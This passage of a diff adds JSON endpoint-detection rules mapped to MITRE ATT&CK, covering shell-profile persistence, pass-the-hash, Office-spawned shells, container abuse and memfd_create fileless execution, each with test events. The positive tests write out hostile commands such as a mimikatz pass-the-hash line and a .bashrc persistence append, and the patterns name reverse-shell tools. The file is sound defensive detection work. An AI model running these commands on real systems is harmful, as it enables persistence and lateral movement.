+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/notes.txt",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.x.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-lx-shell-rc-append-payload",
+   "name": "Shell startup file appended with a launcher",
+   "description": "A command appends to .bashrc, .zshrc, .profile or similar a line that starts a background job from a temp path, downloads code or opens a reverse shell.",
+   "tactic": "Persistence",
+   "technique": "T1546.004",
+   "technique_name": "Event Triggered Execution: Unix Shell Configuration Modification",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": ">>\\s*\\S*\\.(bashrc|bash_profile|zshrc|zprofile|profile)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(nohup|/tmp/|/dev/shm/|curl\\s|wget\\s|base64\\s+-d|bash\\s+-i|/dev/tcp/|\\bnc\\s)"
+     }
+    ]
+   },
+   "tags": [
+    "shell-profile",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "echo 'nohup /tmp/.x &' >> ~/.bashrc",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "echo 'export PATH=$PATH:/opt/bin' >> ~/.bashrc",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "echo 'nohup /tmp/.x &' > /tmp/log",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-pass-the-hash-tooling-args",
+   "name": "Pass-the-hash arguments on a command line",
+   "description": "A command line supplies an NTLM hash directly to a tool: mimikatz sekurlsa::pth, impacket -hashes, pth-* utilities or /ntlm:.",
+   "tactic": "Lateral Movement",
+   "technique": "T1550.002",
+   "technique_name": "Use Alternate Authentication Material: Pass the Hash",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "sekurlsa::pth"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-hashes\\s+[0-9a-f]{32}:[0-9a-f]{32}"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-hashes\\s+:[0-9a-f]{32}"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/pth-(winexe|smbclient|wmic|net|rpcclient)$"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/ntlm:[0-9a-f]{32}"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/user:"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "pth",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Tools\\mimikatz.exe",
+      "command": "mimikatz.exe \"sekurlsa::pth /user:admin /domain:corp /ntlm:8846f7eaee8fb117ad06bdd830b7586c\" exit",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c dir",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     },
+     {
+      "executable": "/usr/bin/smbclient",
+      "command": "smbclient //10.0.0.5/data -U ann",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-win-office-spawns-script-host",
+   "name": "Office application spawns a command or script interpreter",
+   "description": "Word, Excel, PowerPoint, Outlook or OneNote starts cmd, PowerShell, a script host or a proxy-execution binary, the post-click step of a malicious attachment.",
+   "tactic": "Initial Access",
+   "technique": "T1566.001",
+   "technique_name": "Phishing: Spearphishing Attachment",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "\\\\(winword|excel|powerpnt|outlook|onenote)\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)\\.exe$"
+     }
+    ]
+   },
+   "tags": [
+    "office",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c powershell -w hidden -c calc",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c dir",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\notepad.exe",
+      "command": "notepad.exe",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-container-exec-session",
+   "name": "Command executed inside a container",
+   "description": "docker, podman, nerdctl or kubectl exec runs a command in a running container; routine for operators, informational.",
+   "tactic": "Execution",
+   "technique": "T1609",
+   "technique_name": "Container Administration Command",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(docker|podman|nerdctl|kubectl)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\sexec\\s"
+     }
+    ]
+   },
+   "tags": [
+    "container",
+    "gap-closure",
+    "noisy-risk"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker exec -it web sh -c 'cat /etc/passwd'",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker ps",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker logs web",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-container-run-detached-privileged",
+   "name": "Detached privileged or host-namespace container started",
+   "description": "docker or podman run -d with --privileged or --pid=host starts a long-lived container with host-level reach.",
+   "tactic": "Execution",
+   "technique": "T1610",
+   "technique_name": "Deploy Container",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(docker|podman|nerdctl)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\srun\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-d\\b|\\s-[a-z]*d[a-z]*\\s|--detach)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(--privileged|--pid[= ]host|--cap-add[= ]sys_admin)"
+     }
+    ]
+   },
+   "tags": [
+    "container",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -d --net=host --pid=host --privileged ubuntu sleep 9999",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -d -p 80:80 nginx",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm --privileged ubuntu id",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gap-any-memfd-create-inline-interpreter",
+   "name": "Inline interpreter code using memfd_create",
+   "description": "python, perl or ruby one-liners call memfd_create (and usually fexecve), running code from an anonymous memory file with nothing on disk.",
+   "tactic": "Defense Evasion",
+   "technique": "T1620",
+   "technique_name": "Reflective Code Loading",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(python[0-9.]*|perl|ruby)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "memfd_create"
+     }
+    ]
+   },
+   "tags": [
+    "fileless",
+    "gap-closure"
+   ],
+   "batch": "gaps-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c \"import os;fd=os.memfd_create('x');os.fexecve(fd,['x'],{})\"",
+      "parent_exe": "/bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c \"print(1)\"",
+      "parent_exe": "/bin/bash"
+     },
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 app.py",
+      "parent_exe": "/bin/bash"
+     }
+    ]
+   }
+  }
+ ]
+}
